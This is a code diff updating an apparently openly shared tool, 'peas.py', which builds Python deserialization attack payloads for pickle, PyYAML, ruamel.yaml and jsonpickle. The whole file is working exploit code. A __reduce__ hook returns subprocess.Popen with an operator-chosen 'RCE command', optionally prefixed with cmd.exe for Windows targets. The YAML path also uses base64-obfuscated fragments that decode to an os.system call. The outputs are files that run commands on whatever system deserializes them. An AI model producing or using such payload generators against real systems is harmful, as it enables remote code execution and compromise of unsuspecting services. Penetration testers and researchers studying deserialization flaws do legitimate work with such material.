@@ -1,6 +1,6 @@
-# Python Deserialization attack payload file generator for pickle ,pyYAML and jsonpickle module by j0lt
-# Requirements : Python 3 , module jsonpickle
-# Version : 2.1
+# Python Deserialization attack payload file generator for pickle ,pyYAML, ruamel.yaml and jsonpickle module by j0lt
+# Requirements : Python 3.x , modules jsonpickle, pyyaml
+# Version : 2.2
 # Usage : python peas.py
 
 import pickle
@@ -10,70 +10,71 @@ import yaml
 import subprocess
 
 
-class Payload(object):
-
-    def __init__(self, cmd, location, base):
-        self.cmd = cmd
-        self.location = location
-        self.base = base
-
-    def pick(self):
-        by = pickle.dumps(Payload(tuple(self.cmd.split(" ")), self.location, self.base))
-        by = self.verifyencoding(by)
-        open(self.location.__add__("_pick"), "wb").write(by)
-
-    def ya(self):
-        by = bytes(yaml.dump(Payload(tuple(self.cmd.split(" ")), self.location, self.base)), 'utf-8')
-        if "\'" in self.cmd or "\"" in self.cmd:
-            by = b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gcHl0a"
-                           "G9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NG"
-                           "RlY29kZSgn")+b64encode(bytes(self.cmd, 'utf-8'))+b64decode("JykpIg==")
-        by = self.verifyencoding(by)
-        open(self.location.__add__("_yaml"), "wb").write(by)
-
-    def js(self):
-        by = bytes(jsonpickle.encode(Payload(tuple(self.cmd.split(" ")), self.location, self.base)), 'utf-8')
-        by = self.verifyencoding(by)
-        open(self.location.__add__("_jspick"), "wb").write(by)
-
-    def __add__(self, other):
-
-        return self + other
+class Gen(object):
+    def __init__(self, payload):
+        self.payload = payload
 
     def __reduce__(self):
-        return subprocess.Popen, (self.cmd,)
+        return subprocess.Popen, (self.payload,)
 
-    def verifyencoding(self, s):
-        if self.base:
-            return b64encode(s)
-        else:
-            return s
+
+class Payload(object):
+
+    def __init__(self, c, location, base, os):
+        self.location = location
+        self.base = base
+        self.os = os
+        self.cmd = c if self.os == 'linux' else "cmd.exe /c " + c
+        self.payload = b''
+
+    def pick(self):
+        self.payload = pickle.dumps(Gen(tuple(self.cmd.split(" "))))
+        self.payload = self.verifyencoding()
+        self.savingfile("_pick")
+
+    def ya(self):
+        self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
+        if "\'" in self.cmd or "\"" in self.cmd:
+            self.payload = b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0g"
+                                     "cHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiY"
+                                     "XNlNjQnKS5iNjRkZWNvZGUoJw==") + b64encode(bytes(self.cmd, 'utf-8')) + \
+                           b64decode("JykuZGVjb2RlKCkpKSI=")
+        self.payload = self.verifyencoding()
+        self.savingfile("_yaml")
+
+    def js(self):
+        self.payload = bytes(jsonpickle.encode(Gen(tuple(self.cmd.split(" ")))),
+                             'utf-8')
+        self.payload = self.verifyencoding()
+        self.savingfile("_jspick")
+
+    def __add__(self, other):
+        return self + other
+
+    def verifyencoding(self):
+        return b64encode(self.payload) if self.base else self.payload
+
+    def savingfile(self, suffix):
+        open(self.location.__add__(suffix), "wb").write(self.payload)
 
 
 if __name__ == "__main__":
     cmd = input("Enter RCE command :")
-    b = True if input("Want to base64 encode payload ? (N/y) :").lower() == "y" else False
-    location = input("Enter File location and name to save :")
-    p = Payload(cmd, location, b)
+    o = 'linux' if input("Enter operating system of target [linux/windows] . Default is linux :").lower() != "windows" \
+        else 'windows'
+    b = True if input("Want to base64 encode payload ? [N/y] :").lower() == "y" else False
+    p = Payload(cmd, input("Enter File location and name to save :"), b, o)
+    funtiondict = {"pickle": p.pick, "pyyaml": p.ya, "ruamel.yaml": p.ya, "jsonpickle": p.js}
     while 1:
-        module = input("Select Module (Pickle, PyYAML, jsonpickle, All) :").lower()
-
-        if module == "pickle":
-            p.pick()
-            break
-        elif module == "pyyaml":
-            p.ya()
-            break
-        elif module == "jsonpickle":
-            p.js()
+        module = input("Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :").lower()
+        if module in funtiondict.keys():
+            funtiondict[module]()
             break
         elif module == "all":
-            p.pick()
-            p.ya()
+            for i in funtiondict.keys():
+                funtiondict[i]()
             break
-
         else:
             print("Wrong Input ")
             continue
-
-    print("done")
+    print("Done Saving file !!!!")
